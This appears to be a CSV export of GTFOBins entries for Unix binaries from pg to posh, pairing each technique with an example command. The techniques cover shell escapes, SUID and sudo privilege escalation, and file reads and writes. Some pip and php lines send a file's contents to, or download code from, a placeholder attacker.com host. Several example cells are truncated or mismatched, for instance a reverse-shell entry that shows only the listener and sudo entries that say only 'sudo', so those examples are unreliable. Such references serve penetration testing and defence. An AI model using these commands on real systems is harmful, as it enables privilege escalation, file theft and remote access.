Binary,Function Name,Function URL,Description,Example
pg,Shell,https://gtfobins.github.io/gtfobins/pg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pg /etc/profile
!/bin/sh"
pg,File read,https://gtfobins.github.io/gtfobins/pg/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",pg file_to_read
pg,SUID,https://gtfobins.github.io/gtfobins/pg/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pg,Sudo,https://gtfobins.github.io/gtfobins/pg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
php,Shell,https://gtfobins.github.io/gtfobins/php/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'"
php,Command,https://gtfobins.github.io/gtfobins/php/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"export CMD=""id""
php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
php,Reverse shell,https://gtfobins.github.io/gtfobins/php/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
php,File upload,https://gtfobins.github.io/gtfobins/php/#file-upload,It can exfiltrate files on the network.,"LHOST=0.0.0.0
LPORT=8888
php -S $LHOST:$LPORT"
php,File download,https://gtfobins.github.io/gtfobins/php/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'"
php,File write,https://gtfobins.github.io/gtfobins/php/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
php -r 'file_put_contents(getenv(""LFILE""), ""DATA"");'"
php,File read,https://gtfobins.github.io/gtfobins/php/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","export LFILE=file_to_read
php -r 'readfile(getenv(""LFILE""));'"
php,SUID,https://gtfobins.github.io/gtfobins/php/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
php,Sudo,https://gtfobins.github.io/gtfobins/php/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
php,Capabilities,https://gtfobins.github.io/gtfobins/php/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
pic,Shell,https://gtfobins.github.io/gtfobins/pic/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pic -U
.PS
sh X sh X"
pic,File read,https://gtfobins.github.io/gtfobins/pic/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
pic $LFILE"
pic,Sudo,https://gtfobins.github.io/gtfobins/pic/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pic,Limited SUID,https://gtfobins.github.io/gtfobins/pic/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pico,Shell,https://gtfobins.github.io/gtfobins/pico/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"pico
^R^X
reset; sh 1>&0 2>&0"
pico,File write,https://gtfobins.github.io/gtfobins/pico/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","pico file_to_write
DATA
^O"
pico,File read,https://gtfobins.github.io/gtfobins/pico/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",pico file_to_read
pico,Sudo,https://gtfobins.github.io/gtfobins/pico/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pico,Limited SUID,https://gtfobins.github.io/gtfobins/pico/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pidstat,Command,https://gtfobins.github.io/gtfobins/pidstat/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
pidstat -e $COMMAND"
pidstat,SUID,https://gtfobins.github.io/gtfobins/pidstat/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pidstat,Sudo,https://gtfobins.github.io/gtfobins/pidstat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pip,Shell,https://gtfobins.github.io/gtfobins/pip/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF"
pip,Reverse shell,https://gtfobins.github.io/gtfobins/pip/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
pip,File upload,https://gtfobins.github.io/gtfobins/pip/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
pip install $TF"
pip,File download,https://gtfobins.github.io/gtfobins/pip/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' > $TF/setup.py
pip install $TF"
pip,File write,https://gtfobins.github.io/gtfobins/pip/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""open('$LFILE','w+').write('DATA')"" > $TF/setup.py
pip install $TF"
pip,File read,https://gtfobins.github.io/gtfobins/pip/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp -d)
echo 'raise Exception(open(""file_to_read"").read())' > $TF/setup.py
pip install $TF"
pip,Library load,https://gtfobins.github.io/gtfobins/pip/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
pip install $TF"
pip,Sudo,https://gtfobins.github.io/gtfobins/pip/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pkexec,Sudo,https://gtfobins.github.io/gtfobins/pkexec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pkg,Sudo,https://gtfobins.github.io/gtfobins/pkg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
posh,Shell,https://gtfobins.github.io/gtfobins/posh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,posh
posh,Sudo,https://gtfobins.github.io/gtfobins/posh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
